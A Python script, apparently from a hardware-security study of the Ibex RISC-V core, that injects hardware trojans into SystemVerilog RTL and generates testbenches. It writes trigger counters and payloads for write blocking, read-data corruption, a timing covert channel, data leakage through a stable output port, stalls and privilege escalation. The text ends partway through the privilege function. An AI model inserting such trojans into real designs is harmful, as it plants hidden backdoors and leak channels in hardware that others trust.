#!/usr/bin/env python3
"""
Multi-Trojan Simulation Preparation Script - SMART RTL-AWARE VERSION
Integrates multiple trojans into original RTL and generates testbenches + VCD support.

Improvements over previous version:
  - Smart signal discovery (write-enable, observable outputs, multi-bit signals)
  - Module-aware payload injection (works on ibex_csr AND ibex_cs_registers)
  - Proper package-aware testbench generation for complex modules
  - All 6 trojan types correctly inject AND produce observable VCD changes

FIXES v3:
  - Covert: use re.sub (not str.replace) to handle leading whitespace in assign lines
  - Covert: always use csr_wdata_i as data source, not 1-bit trigger signal
  - Leak: use csr_wdata_i as source (not static priv_lvl_q); fix trigger to use csr_op_en_i
  - Privilege: make detectable by XOR-corrupting csr_rdata_o + forcing priv to user→machine
  - Testbench: hart_id_i=32'h1, add user-mode privilege writes for privilege trojan visibility

Author: Sharjeel Imtiaz (TalTech)
Date: February 2026
"""

import os
import sys
import re
import random
from pathlib import Path
from typing import List, Dict, Tuple, Optional


# ──────────────────────────────────────────────────────────────────────────────
# RTL Analysis Helpers
# ──────────────────────────────────────────────────────────────────────────────

def find_write_enable(rtl: str) -> Optional[str]:
    """
    Find the primary write-enable / operation-enable signal.
    Priority: csr_we_int internal signal > csr_op_en_i > wr_en_i > first assign gating write.
    Returns the signal name or None.
    """
    if re.search(r'assign\s+csr_we_int\s*=', rtl):
        return 'csr_we_int'
    for name in ('csr_op_en_i', 'wr_en_i', 'we_i', 'write_en_i'):
        if re.search(rf'\b{name}\b', rtl):
            return name
    return None


def find_observable_output(rtl: str, prefer_wide: bool = True) -> Optional[str]:
    """
    Find the best observable output signal to carry a trojan payload.
    Priority: csr_rdata_o (32-bit) > rd_data_o (32-bit) > any _o logic[31:0] > any 1-bit output.
    """
    for name in ('csr_rdata_o', 'rd_data_o'):
        if re.search(rf'\boutput\b.*\b{name}\b', rtl):
            return name
    m = re.search(r'assign\s+(\w+_o)\s*=\s*(\w+_int)\s*;', rtl)
    if m:
        return m.group(1)
    m = re.search(r'assign\s+(csr_mstatus\w*_o|illegal_csr\w*_o)\s*=', rtl)
    if m:
        return m.group(1)
    return None


def find_internal_rdata(rtl: str) -> Optional[str]:
    """Find the internal csr_rdata signal (before the assign to output)."""
    for name in ('csr_rdata_int', 'rd_data_int', 'rdata_int'):
        if re.search(rf'\b{name}\b', rtl):
            return name
    return None


def find_privilege_output(rtl: str) -> Optional[str]:
    """Find privilege level output signal."""
    for name in ('priv_mode_id_o', 'priv_lvl_o', 'privilege_o'):
        if re.search(rf'assign\s+{name}\s*=', rtl):
            return name
    return None


def find_privilege_register(rtl: str) -> Optional[str]:
    """Find internal privilege level register (non-enum, indexable)."""
    for name in ('priv_lvl_q', 'priv_lvl', 'privilege_q'):
        if re.search(rf'\b{name}\b', rtl):
            return name
    return None


def find_multibig_input(rtl: str, exclude: List[str] = None) -> Optional[str]:
    """Find a 32-bit input signal suitable for bit indexing (covert/leak source)."""
    exclude = exclude or []
    candidates = re.findall(r'input\s+logic\s*\[31:0\]\s+(\w+)', rtl)
    for c in candidates:
        if c not in exclude:
            return c
    candidates = re.findall(r'input\s+logic\s*\[(\d+):0\]\s+(\w+)', rtl)
    for bits, name in candidates:
        if int(bits) >= 7 and name not in exclude:
            return name
    return None


def find_single_bit_output(rtl: str, exclude: List[str] = None) -> Optional[str]:
    """Find a 1-bit output for leak channel."""
    exclude = exclude or []
    m = re.findall(r'output\s+logic\s+(\w+)', rtl)
    for name in m:
        if name not in exclude:
            return name
    return None


def uses_packages(rtl: str) -> List[str]:
    """Detect which packages are imported."""
    return re.findall(r'import\s+(\w+)::\*', rtl)


def extract_module_ports(rtl: str) -> Dict:
    """
    Robustly parse the module port list from ANY SystemVerilog module.

    Handles:
      - Simple:            module foo (input logic clk, ...);
      - With params:       module foo #(...) (input logic clk, ...);
      - With pkg import:   module foo import pkg::*; #(...) (...);
      - Package-typed:     input ibex_pkg::csr_num_e csr_addr_i
      - Unpacked arrays:   output ibex_pkg::pmp_cfg_t cfg_o [4]
      - Parameterized:     input logic [WIDTH-1:0] x_i

    Strategy: find the LAST ") (" in the module declaration header —
    that transition always marks where parameters close and ports open.
    For modules with no parameters, find the first "(" after the module name.
    """
    # ── Step 1: Locate port list ───────────────────────────────────────────
    mod_match = re.search(r'module\s+\w+', rtl)
    if not mod_match:
        return {'inputs': [], 'outputs': []}

    mod_start = mod_match.start()

    # Search window: module declaration up to 8000 chars
    # (ibex_cs_registers has ~1600 char parameter block)
    search_window = rtl[mod_start:mod_start + 8000]

    # Find port list open:
    # Case A: module has #(...) params → last ") (" is param-close + port-open
    # Case B: module has no params    → first "(" after module name
    sep_matches = list(re.finditer(r'\)\s*\(', search_window))

    port_open_abs = -1
    if sep_matches:
        # Use LAST ") (" in search window — handles nested parens in params
        last_sep = sep_matches[-1]
        # port list opens at the "(" of this transition
        port_open_abs = mod_start + last_sep.end() - 1
    else:
        # No parameters — find first "(" after module name + optional import
        first_paren = re.search(r'\(', search_window)
        if first_paren:
            port_open_abs = mod_start + first_paren.start()

    if port_open_abs == -1:
        return {'inputs': [], 'outputs': []}

    # Walk forward to find matching close paren
    depth = 0
    port_close_abs = -1
    for i in range(port_open_abs, min(len(rtl), port_open_abs + 20000)):
        if rtl[i] == '(':
            depth += 1
        elif rtl[i] == ')':
            depth -= 1
            if depth == 0:
                port_close_abs = i
                break

    if port_close_abs == -1:
        return {'inputs': [], 'outputs': []}

    port_text = rtl[port_open_abs + 1:port_close_abs]

    # ── Step 2: Split into individual port declarations ────────────────────
    # Each port declaration ends with , or end-of-text
    # We handle multi-line by joining and splitting on commas carefully
    # Remove comments first
    port_text = re.sub(r'//[^\n]*', '', port_text)
    port_text = re.sub(r'/\*.*?\*/', '', port_text, flags=re.DOTALL)

    # Split on commas that are NOT inside [] or ()
    def split_ports(text):
        parts = []
        depth_sq = 0
        depth_rn = 0
        current = []
        for ch in text:
            if ch == '[': depth_sq += 1
            elif ch == ']': depth_sq -= 1
            elif ch == '(': depth_rn += 1
            elif ch == ')': depth_rn -= 1
            elif ch == ',' and depth_sq == 0 and depth_rn == 0:
                parts.append(''.join(current).strip())
                current = []
                continue
            current.append(ch)
        if current:
            parts.append(''.join(current).strip())
        return parts

    raw_ports = split_ports(port_text)

    # ── Step 3: Parse each port declaration ───────────────────────────────
    ports = {'inputs': [], 'outputs': []}

    # Regex patterns for port parsing
    # Group 1: direction (input/output/inout)
    # Group 2: full type string (may include packed dims)
    # Group 3: port name
    # Group 4: optional unpacked dims e.g. [4] or [PMPNumRegions]

    # Pattern A: standard  input logic [N:0] name [unpacked]
    # Pattern B: pkg-typed input pkg::type name [unpacked]
    PORT_RE = re.compile(
        r'^\s*(input|output|inout)\s+'       # direction
        r'((?:logic|wire|reg|'               # base type OR
        r'(?:\w+::[\w:]+)|'                  # package type pkg::type
        r'\w+)'                              # plain type
        r'(?:\s*\[[\w\s+\-*/:\'\"]+\])*)'   # optional packed dims
        r'\s+(\w+)'                          # signal name
        r'((?:\s*\[[\w\s+\-*/:\'\"]+\])*)'  # optional unpacked dims
        r'\s*$',
        re.VERBOSE
    )

    for raw in raw_ports:
        raw = raw.strip()
        if not raw:
            continue

        m = PORT_RE.match(raw)
        if not m:
            # Try simpler fallback: just get direction and last word as name
            fm = re.match(r'\s*(input|output|inout)\s+.*?(\w+)\s*$', raw)
            if fm:
                direction = fm.group(1)
                name = fm.group(2)
                entry = {
                    'name': name, 'type': 'logic', 'width': '',
                    'unpacked': '', 'is_pkg': False, 'pkg_init': "'0",
                    'raw_type': 'logic'
                }
                ports['inputs' if direction == 'input' else 'outputs'].append(entry)
            continue

        direction = m.group(1)
        full_type = m.group(2).strip()
        name      = m.group(3).strip()
        unpacked  = m.group(4).strip() if m.group(4) else ''

        # ── Resolve parameter names in dims to concrete defaults ──────────
        # Testbenches have no parameters, so [PMPNumRegions] etc. are undefined.
        # Map known ibex/RISC-V parameter names to safe concrete defaults.
        PARAM_DEFAULTS = {
            'PMPNumRegions':    '4',
            'PMP_MAX_REGIONS':  '16',
            'PMP_ADDR_MSB':     '33',   # → [33:0] = 34-bit
            'MHPMCounterNum':   '10',
            'MHPMCounterWidth': '40',
            'DbgHwBreakNum':    '1',
            'WIDTH':            '32',
            'DATA_WIDTH':       '32',
            'ADDR_WIDTH':       '32',
        }
        def resolve_params(s):
            for param, default in PARAM_DEFAULTS.items():
                # Replace standalone param name (not part of larger word)
                s = re.sub(rf'\b{param}\b', default, s)
            return s

        unpacked  = resolve_params(unpacked)
        full_type = resolve_params(full_type)

        # Detect package type
        is_pkg = '::' in full_type

        # Extract packed width if present
        width_m = re.search(r'(\[[\w\s+\-*/:\'\"]+\])', full_type)
        width   = width_m.group(1) if width_m else ''

        # Base type without width
        base_type = re.sub(r'\s*\[[\w\s+\-*/:\'\"]+\]', '', full_type).strip()

        # Determine safe zero-init for package types
        if is_pkg:
            pkg_init = "'0"
        else:
            pkg_init = "1'b0" if not width else "'0"

        entry = {
            'name':     name,
            'type':     base_type,
            'width':    width,
            'unpacked': unpacked,
            'is_pkg':   is_pkg,
            'pkg_init': pkg_init,
            'raw_type': full_type,
        }

        if direction == 'input':
            ports['inputs'].append(entry)
        else:
            ports['outputs'].append(entry)

    return ports


def _replace_assign(rtl: str, signal: str, new_rhs: str, comment: str = '') -> str:
    """
    FIX: Use re.sub to replace assign RHS, handling leading whitespace correctly.
    str.replace fails when the line has leading spaces (e.g. '  assign csr_rdata_o = ...').
    """
    suffix = f'  // {comment}' if comment else ''
    def replacer(m):
        return f'{m.group(1)}assign {signal} = {new_rhs};{suffix}'
    result = re.sub(
        rf'(\s*)assign\s+{signal}\s*=\s*[^;]+;',
        replacer, rtl, count=1
    )
    return result


# ──────────────────────────────────────────────────────────────────────────────
# Main Integrator Class
# ──────────────────────────────────────────────────────────────────────────────

class MultiTrojanIntegrator:
    """Integrates multiple trojans into an RTL module and creates VCD testbenches."""

    def __init__(self, original_rtl: str, trojans_dir: str = None, output_dir: str = None):
        self.original_rtl = Path(original_rtl)
        if not self.original_rtl.exists():
            raise FileNotFoundError(f"RTL file not found: {self.original_rtl}")

        with open(self.original_rtl, 'r', encoding='utf-8') as f:
            self.original_rtl_content = f.read()

        self.module_name   = self._extract_module_name()
        self.clock_signal  = self._extract_clock_signal()
        self.reset_signal  = self._extract_reset_signal()
        self.packages      = uses_packages(self.original_rtl_content)

        if trojans_dir is None:
            trojans_dir = self.original_rtl.parent.parent / "generated_trojans"
        self.trojans_dir = Path(trojans_dir)

        if output_dir is None:
            output_dir = self.original_rtl.parent.parent / "trojaned_rtl" / self.module_name
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)

        processor_name = self.original_rtl.parent.parent.name
        self.tb_dir = (self.original_rtl.parent.parent.parent.parent /
                       "testbenches" / processor_name / self.module_name)
        self.tb_dir.mkdir(parents=True, exist_ok=True)

        print(f"📦 Module:      {self.module_name}")
        print(f"🔗 Packages:    {self.packages or 'none'}")
        print(f"📂 Trojans:     {self.trojans_dir}")
        print(f"📂 Output:      {self.output_dir}")
        print(f"📂 Testbenches: {self.tb_dir}")

    # ── Module Info Extraction ─────────────────────────────────────────────

    def _extract_module_name(self) -> str:
        m = re.search(r'module\s+(\w+)', self.original_rtl_content)
        if not m:
            raise ValueError("Cannot find module declaration")
        return m.group(1)

    def _extract_clock_signal(self) -> str:
        for pat in [r'input\s+(?:logic\s+)?(\w*clk\w*)', r'\b(\w*clk\w*)\b']:
            m = re.search(pat, self.original_rtl_content, re.IGNORECASE)
            if m:
                return m.group(1)
        return 'clk_i'

    def _extract_reset_signal(self) -> str:
        for pat in [r'input\s+(?:logic\s+)?(\w*rst\w*)', r'\b(\w*rst\w*)\b']:
            m = re.search(pat, self.original_rtl_content, re.IGNORECASE)
            if m:
                return m.group(1)
        return 'rst_ni'

    # ── Trojan File Discovery ──────────────────────────────────────────────

    def find_trojan_files(self) -> List[Path]:
        pattern = f"T*_{self.module_name}_*.sv"
        files = sorted(self.trojans_dir.glob(pattern))
        if not files:
            print(f"⚠️  No trojan files found: {pattern} in {self.trojans_dir}")
        return files

    # ── Trigger Generation ─────────────────────────────────────────────────

    def _safe_trigger_signal(self, signal: str, rtl: str) -> str:
        """Validate trigger signal exists in RTL; fall back to csr_op_en_i or wr_en_i."""
        if signal and re.search(rf'\b{signal}\b', rtl):
            return signal
        for fallback in ('csr_op_en_i', 'wr_en_i', 'csr_access_i'):
            if re.search(rf'\b{fallback}\b', rtl):
                print(f"   ⚠️  Trigger signal '{signal}' not found → using '{fallback}'")
                return fallback
        return 'csr_op_en_i'

    def _safe_counter_signal(self, signal: str, rtl: str) -> str:
        """Find a multi-bit signal safe to use in |reduction for counter gating."""
        if signal and re.search(rf'input\s+logic\s*\[.*?\]\s+{signal}\b', rtl):
            return signal
        cand = find_multibig_input(rtl)
        if cand:
            return cand
        return self._safe_trigger_signal(signal, rtl)

    def generate_varied_trigger(self, trojan_index: int, trigger_signal: str,
                                payload_signal: str, threshold: int, rtl: str) -> str:
        """Generate trigger logic, validated against actual RTL signals."""
        trig  = self._safe_trigger_signal(trigger_signal, rtl)
        multi = self._safe_counter_signal(payload_signal, rtl)
        ttype = trojan_index % 4
        clk, rst = self.clock_signal, self.reset_signal

        if ttype == 0:
            return f"""
    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold={threshold})
    // ============================================================
    localparam int TRIGGER_THRESHOLD = {threshold};
    logic [15:0] trojan_counter;
    logic        trojan_active;
    always_ff @(posedge {clk} or negedge {rst}) begin
        if (!{rst}) begin
            trojan_counter <= '0;
            trojan_active  <= 1'b0;
        end else begin
            if ({trig}) trojan_counter <= trojan_counter + 1;
            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
        end
    end"""

        elif ttype == 1:
            return f"""
    // ============================================================
    // TROJAN TRIGGER - Type 2: Signal Combination (threshold={threshold})
    // ============================================================
    localparam int TRIGGER_THRESHOLD = {threshold};
    logic [15:0] trojan_counter;
    logic        trojan_active;
    always_ff @(posedge {clk} or negedge {rst}) begin
        if (!{rst}) begin
            trojan_counter <= '0;
            trojan_active  <= 1'b0;
        end else begin
            if ({trig} && |{multi}) trojan_counter <= trojan_counter + 1;
            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
        end
    end"""

        elif ttype == 2:
            return f"""
    // ============================================================
    // TROJAN TRIGGER - Type 3: Two-Stage (threshold={threshold})
    // ============================================================
    localparam int TRIGGER_THRESHOLD = {threshold};
    logic [15:0] trojan_counter;
    logic        trojan_armed;
    logic        trojan_active;
    always_ff @(posedge {clk} or negedge {rst}) begin
        if (!{rst}) begin
            trojan_counter <= '0;
            trojan_armed   <= 1'b0;
            trojan_active  <= 1'b0;
        end else begin
            if (|{multi}) trojan_counter <= trojan_counter + 1;
            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
            if (trojan_armed && {trig}) trojan_active <= 1'b1;
        end
    end"""

        else:
            arm_t = threshold // 2
            act_t = threshold // 4
            return f"""
    // ============================================================
    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm={arm_t}, act={act_t})
    // ============================================================
    localparam int ARM_THRESHOLD   = {arm_t};
    localparam int ACTIVATE_DELAY  = {act_t};
    logic [15:0] trojan_counter1, trojan_counter2;
    logic        trojan_armed, trojan_active;
    always_ff @(posedge {clk} or negedge {rst}) begin
        if (!{rst}) begin
            trojan_counter1 <= '0;
            trojan_counter2 <= '0;
            trojan_armed    <= 1'b0;
            trojan_active   <= 1'b0;
        end else begin
            if (!trojan_armed && {trig}) trojan_counter1 <= trojan_counter1 + 1;
            if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
            if (trojan_armed && !trojan_active && {trig}) trojan_counter2 <= trojan_counter2 + 1;
            if (trojan_counter2 >= ACTIVATE_DELAY) trojan_active <= 1'b1;
        end
    end"""

    # ── Payload Strategies ─────────────────────────────────────────────────

    def apply_dos_payload(self, rtl: str, payload_signal: str) -> str:
        """
        DoS: Block writes when trojan active.
        Strategy A (preferred): gate the internal write-enable assign.
        Strategy B (fallback): gate if-statements on payload_signal.
        """
        we = find_write_enable(rtl)

        if we and re.search(rf'assign\s+{we}\s*=', rtl):
            old_m = re.search(rf'(assign\s+{we}\s*=\s*[^;]+;)', rtl)
            if old_m:
                original_assign = old_m.group(1)
                new_assign = original_assign.rstrip(';') + ' & ~trojan_active;  // TROJAN DoS: block writes'
                result = rtl.replace(original_assign, new_assign, 1)
                print(f"   ✅ DoS: gated '{we}' assign")
                return result

        sig = payload_signal if re.search(rf'\b{payload_signal}\b', rtl) else (we or 'wr_en_i')
        modified = re.sub(rf'(\s+)if\s*\(\s*{sig}\s*\)\s*begin',
                          rf'\1if ({sig} && !trojan_active) begin', rtl)
        if '!trojan_active' in modified:
            print(f"   ✅ DoS: gated if-statements on '{sig}'")
        else:
            print(f"   ⚠️  DoS: no injection point found for '{sig}'")
        return modified

    def apply_integrity_payload(self, rtl: str, payload_signal: str) -> str:
        """
        Integrity: XOR corrupt a readable output.
        Strategy A (preferred): corrupt csr_rdata_o / rd_data_o via internal wire.
        Strategy B: corrupt any assign output.
        """
        corruption = "32'hDEADBEEF"
        out_sig = find_observable_output(rtl)
        int_sig = find_internal_rdata(rtl)

        if out_sig and int_sig and re.search(rf'assign\s+{out_sig}\s*=\s*{int_sig}\s*;', rtl):
            new_rhs = f'trojan_active ? ({int_sig} ^ {corruption}) : {int_sig}'
            result  = _replace_assign(rtl, out_sig, new_rhs, 'TROJAN Integrity')
            print(f"   ✅ Integrity: XOR on '{out_sig}' via '{int_sig}'")
            return result

        if out_sig and re.search(rf'assign\s+{out_sig}\s*=\s*([^;]+);', rtl):
            def replacer(m):
                expr = m.group(1).strip()
                return f'assign {out_sig} = trojan_active ? ({expr} ^ {corruption}) : {expr};  // TROJAN Integrity'
            result = re.sub(rf'(\s*)assign\s+{out_sig}\s*=\s*([^;]+);',
                            lambda m: f'{m.group(1)}assign {out_sig} = trojan_active ? ({m.group(2).strip()} ^ {corruption}) : {m.group(2).strip()};  // TROJAN Integrity',
                            rtl, count=1)
            print(f"   ✅ Integrity: XOR on '{out_sig}'")
            return result

        for sig in [payload_signal, None]:
            pat = (rf'assign\s+{sig}\s*=\s*([^;]+);' if sig else r'assign\s+(\w+_o)\s*=\s*([^;]+);')
            m = re.search(pat, rtl)
            if m:
                target = sig or m.group(1)
                result = re.sub(
                    rf'(\s*)assign\s+{target}\s*=\s*([^;]+);',
                    lambda mx: f'{mx.group(1)}assign {target} = trojan_active ? ({mx.group(2).strip()} ^ {corruption}) : {mx.group(2).strip()};  // TROJAN Integrity',
                    rtl, count=1)
                print(f"   ✅ Integrity: XOR on '{target}' (fallback)")
                return result

        print(f"   ⚠️  Integrity: no injection point found")
        return rtl

    def apply_covert_payload(self, rtl: str, trigger_signal: str, payload_signal: str) -> str:
        """
        Covert: Timing modulation channel.
        FIX v3: Always use csr_wdata_i (32-bit, changes every write) as data source.
                Use re.sub (_replace_assign) to handle leading whitespace on assign lines.
        """
        clk, rst = self.clock_signal, self.reset_signal

        # FIX: Always prefer csr_wdata_i — it changes every CSR write cycle
        data_src = None
        for preferred in ('csr_wdata_i', 'wr_data_i', 'wdata_i'):
            if re.search(rf'input\s+logic\s*\[31:0\]\s+{preferred}\b', rtl):
                data_src = preferred
                break
        if not data_src:
            data_src = find_multibig_input(rtl) or 'csr_wdata_i'
        print(f"   ℹ️  Covert data source: '{data_src}'")

        covert_logic = f"""
    // ── COVERT CHANNEL: Timing modulation ──────────────────────────────────
    logic       covert_bit_out;
    logic [7:0] covert_delay_counter;
    logic [4:0] covert_bit_index;
    logic       covert_current_bit;
    assign covert_current_bit = {data_src}[covert_bit_index[4:0]];
    always_ff @(posedge {clk} or negedge {rst}) begin
        if (!{rst}) begin
            covert_bit_out       <= 1'b0;
            covert_delay_counter <= '0;
            covert_bit_index     <= '0;
        end else if (trojan_active) begin
            if (covert_delay_counter < (covert_current_bit ? 8'd10 : 8'd5)) begin
                covert_delay_counter <= covert_delay_counter + 1;
                covert_bit_out       <= 1'b1;
            end else begin
                covert_bit_out       <= 1'b0;
                covert_delay_counter <= '0;
                covert_bit_index     <= covert_bit_index + 1;
            end
        end else begin
            covert_bit_out <= 1'b0; covert_delay_counter <= '0; covert_bit_index <= '0;
        end
    end
    // ────────────────────────────────────────────────────────────────────────
"""
        # Insert covert logic after trigger always_ff block
        m_end = re.search(r"(trojan_active\s*<=\s*1'b1[^e]*?end\s*end)", rtl, re.DOTALL)
        if m_end:
            insert_pos = m_end.end()
            rtl = rtl[:insert_pos] + '\n' + covert_logic + rtl[insert_pos:]
        else:
            m_par = re.search(r'\)\s*;', rtl)
            if m_par:
                rtl = rtl[:m_par.end()] + '\n' + covert_logic + rtl[m_par.end():]

        # FIX: Use _replace_assign to handle leading whitespace correctly
        out_sig = find_observable_output(rtl)
        int_sig = find_internal_rdata(rtl)

        if out_sig and int_sig and re.search(rf'assign\s+{out_sig}\s*=\s*{int_sig}\s*;', rtl):
            new_rhs = f'trojan_active ? {{{int_sig}[31:1], covert_bit_out}} : {int_sig}'
            rtl = _replace_assign(rtl, out_sig, new_rhs, 'TROJAN Covert: LSB timing channel')
            print(f"   ✅ Covert: mapped to '{out_sig}[0]' via '{int_sig}'")
        elif out_sig and re.search(rf'assign\s+{out_sig}\s*=\s*([^;]+);', rtl):
            rtl = re.sub(
                rf'(\s*)assign\s+{out_sig}\s*=\s*([^;]+);',
                lambda m: f'{m.group(1)}assign {out_sig} = trojan_active ? {{{m.group(2).strip()}[31:1], covert_bit_out}} : {m.group(2).strip()};  // TROJAN Covert',
                rtl, count=1)
            print(f"   ✅ Covert: mapped to '{out_sig}[0]'")
        else:
            single = find_single_bit_output(rtl)
            if single and re.search(rf'assign\s+{single}\s*=\s*([^;]+);', rtl):
                rtl = re.sub(
                    rf'(\s*)assign\s+{single}\s*=\s*([^;]+);',
                    lambda m: f'{m.group(1)}assign {single} = trojan_active ? covert_bit_out : ({m.group(2).strip()});  // TROJAN Covert',
                    rtl, count=1)
                print(f"   ✅ Covert: mapped to '{single}' (1-bit fallback)")
            else:
                print(f"   ⚠️  Covert: could not map covert_bit_out to any output")
        return rtl

    def apply_leak_payload(self, rtl: str, trigger_signal: str, payload_signal: str) -> str:
        """
        Leak: Route secret bits to observable output.
        FIX v3: Use csr_wdata_i as source (changes every write cycle — always detectable).
                priv_lvl_q is a static enum in machine mode → never shows differences.
                Fix trigger: use csr_op_en_i not csr_mstatus_tw_o (which is the output we modify).
                Forward-declare leak_bit_idx after trigger block.
        """
        clk, rst = self.clock_signal, self.reset_signal

        # FIX: Use csr_wdata_i as source — it changes every CSR write, always detectable
        src = None
        for preferred in ('csr_wdata_i', 'wr_data_i', 'wdata_i'):
            if re.search(rf'input\s+logic\s*\[31:0\]\s+{preferred}\b', rtl):
                src = preferred
                break
        if not src:
            src = find_multibig_input(rtl) or 'csr_wdata_i'
        print(f"   ℹ️  Leak source: '{src}' (32-bit, changes every write)")

        # Index directly into 32-bit source — safe, always different
        bit_index_expr = f'{src}[leak_bit_idx % 32]'

        # FIX: Forward-declare leak_bit_idx right after trigger block
        fwd_decl = "    logic [4:0] leak_bit_idx;  // TROJAN Leak forward decl\n"
        m_trig = re.search(r"trojan_active\s*<=\s*1'b1[^\n]*\n(?:[^\n]*\n)*?\s*end\s*end", rtl, re.DOTALL)
        if m_trig:
            rtl = rtl[:m_trig.end()] + '\n' + fwd_decl + rtl[m_trig.end():]
        else:
            m2 = re.search(r'logic\s+trojan_active\s*;[^\n]*\n', rtl)
            if m2:
                rtl = rtl[:m2.end()] + fwd_decl + rtl[m2.end():]

        # Only always_ff at endmodule (no re-declaration)
        leak_logic_ff = f"""
    // ── INFORMATION LEAK always_ff ───────────────────────────────────────────
    always_ff @(posedge {clk} or negedge {rst}) begin
        if (!{rst}) leak_bit_idx <= '0;
        else if (trojan_active) leak_bit_idx <= leak_bit_idx + 1;
        else leak_bit_idx <= '0;
    end
    // ────────────────────────────────────────────────────────────────────────
"""
        rtl = re.sub(r'endmodule', leak_logic_ff + '\nendmodule', rtl, count=1)

        # ── Leak payload: Route secret data to a STABLE output port ─────────
        # Design principle (distinct from Covert Channel):
        #   Covert Channel: modulates csr_rdata_o[0] via TIMING pulses
        #                   → attacker reads pulse duration (10 vs 5 cycles)
        #   Information Leak: routes secret VALUE to a normally-stable port
        #                   → attacker reads output value directly
        #                   → Trust-Hub AES-T600 analog: key routed to unused port
        #
        # Target: csr_mepc_o — 32-bit output, stable (only changes on exceptions)
        #         When trojan fires: populated with rotating csr_wdata_i bits
        #         Attacker observes unexpected data on exception program counter output
        # ─────────────────────────────────────────────────────────────────────────

        # Find stable 32-bit output port (prefer mepc, depc — normally zero/stable)
        stable_target = None
        for cand in ('csr_mepc_o', 'csr_depc_o', 'csr_mtval_o'):
            if re.search(rf'assign\s+{cand}\s*=', rtl):
                stable_target = cand
                break

        if stable_target:
            # Find internal register driving this output (e.g. mepc_q)
            m_int = re.search(rf'assign\s+{stable_target}\s*=\s*(\w+)\s*;', rtl)
            int_reg = m_int.group(1) if m_int else src
            new_rhs = f'trojan_active ? {{{int_reg}[31:5], {bit_index_expr}}} : {int_reg}'
            rtl = re.sub(
                rf'(\s*)assign\s+{stable_target}\s*=\s*([^;]+);',
                lambda m: f'{m.group(1)}assign {stable_target} = {new_rhs};  // TROJAN Leak: exfil via stable port',
                rtl, count=1)
            print(f"   ✅ Leak: routing '{src}' bits → '{stable_target}' (stable port, value-based exfil)")
            print(f"   ℹ️  Leak is VALUE-based (direct); Covert is TIMING-based (pulse width) — distinct in paper")
        else:
            # Fallback: route into csr_rdata_o[0] if no stable port found
            out_sig = find_observable_output(rtl)
            int_sig = find_internal_rdata(rtl)
            if out_sig and int_sig and re.search(rf'assign\s+{out_sig}\s*=\s*{int_sig}\s*;', rtl):
                new_rhs = f'trojan_active ? {{{int_sig}[31:1], {bit_index_expr}}} : {int_sig}'
                rtl = _replace_assign(rtl, out_sig, new_rhs, 'TROJAN Leak: exfil secret via rdata[0]')
                print(f"   ⚠️  Leak fallback → '{out_sig}[0]' (no stable port found)")
        return rtl

    def apply_availability_payload(self, rtl: str, payload_signal: str) -> str:
        """
        Availability: Periodic stall.
        Strategy A: Gate write-enable assign.
        Strategy B: Gate if-statements.
        FIX: Forward-declare stall vars; no re-declaration in always_ff block.
        """
        clk, rst = self.clock_signal, self.reset_signal

        # Forward-declare right after trigger block
        fwd_decls = ("    logic [7:0] stall_counter;  // TROJAN Availability forward decl\n"
                     "    logic       stall_active;\n")
        m_trig = re.search(r"trojan_active\s*<=\s*1'b1[^\n]*\n(?:[^\n]*\n)*?\s*end\s*end", rtl, re.DOTALL)
        if m_trig:
            rtl = rtl[:m_trig.end()] + '\n' + fwd_decls + rtl[m_trig.end():]
        else:
            m2 = re.search(r'logic\s+trojan_active\s*;[^\n]*\n', rtl)
            if m2:
                rtl = rtl[:m2.end()] + fwd_decls + rtl[m2.end():]

        # Only localparams + always_ff at endmodule (no logic declarations)
        stall_logic_ff = f"""
    // ── AVAILABILITY: Periodic stall always_ff ──────────────────────────────
    localparam int STALL_PERIOD = 16;
    localparam int STALL_CYCLES = 8;
    always_ff @(posedge {clk} or negedge {rst}) begin
        if (!{rst}) begin
            stall_counter <= '0;
            stall_active  <= 1'b0;
        end else if (trojan_active) begin
            if (stall_counter >= STALL_PERIOD[7:0] - 1) stall_counter <= '0;
            else stall_counter <= stall_counter + 1;
            stall_active <= (stall_counter < STALL_CYCLES[7:0]);
        end else begin
            stall_counter <= '0;
            stall_active  <= 1'b0;
        end
    end
    // ────────────────────────────────────────────────────────────────────────
"""
        rtl = re.sub(r'endmodule', stall_logic_ff + '\nendmodule', rtl, count=1)

        we = find_write_enable(rtl)
        if we and re.search(rf'assign\s+{we}\s*=', rtl):
            old_m = re.search(rf'(assign\s+{we}\s*=\s*[^;]+;)', rtl)
            if old_m:
                orig = old_m.group(1)
                new  = orig.rstrip(';') + ' & ~stall_active;  // TROJAN Availability: stall'
                rtl  = rtl.replace(orig, new, 1)
                print(f"   ✅ Availability: stall gated on '{we}'")
                return rtl

        sig = payload_signal if re.search(rf'\b{payload_signal}\b', rtl) else (we or 'wr_en_i')
        modified = re.sub(rf'(\s+)if\s*\(\s*{sig}\s*\)\s*begin',
                          rf'\1if ({sig} && !stall_active) begin', rtl)
        if '!stall_active' in modified:
            print(f"   ✅ Availability: stall gated if-statements on '{sig}'")
        else:
            print(f"   ⚠️  Availability: stall logic inserted but not connected")
        return modified

    def apply_privilege_payload(self, rtl: str, payload_signal: str) -> str:
        """
        Privilege: Escalate privilege AND make it detectable in VCD.
        FIX v3: Since processor starts in machine mode, pure priv_mode override
                produces no visible difference. Additional payload: XOR-corrupt
                csr_rdata_o when trojan is active, making it detectable even when
                privilege level appears unchanged.
        Also override priv_lvl_q FF so privilege escalation is real.
        """
        clk, rst = self.clock_signal, self.reset_signal
        priv_out = find_privilege_output(rtl)
        priv_reg = find_privilege_register(rtl)
        injected = False

        # Override the output assign using re.sub (handles whitespace)
        if priv_out and re.search(rf'assign\s+{priv_out}\s*=', rtl):
            rtl = re.sub(
                rf'(\s*)assign\s+{priv_out}\s*=\s*([^;]+);',
                lambda m: f'{m.group(1)}assign {priv_out} = trojan_active ? PRIV_LVL_M : ({m.group(2).strip()});  // TROJAN Privilege',
                rtl, count=1)
            print(f"   ✅ Privilege: override '{priv_out}' → PRIV_LVL_M")
            injected = True

        # Override the register FF
        if priv_reg:
            ff_pattern = rf'({priv_reg}\s*<=\s*[^;]+;)'
            matches = list(re.finditer(ff_pattern, rtl))
            if matches:
                last = matches[-1]
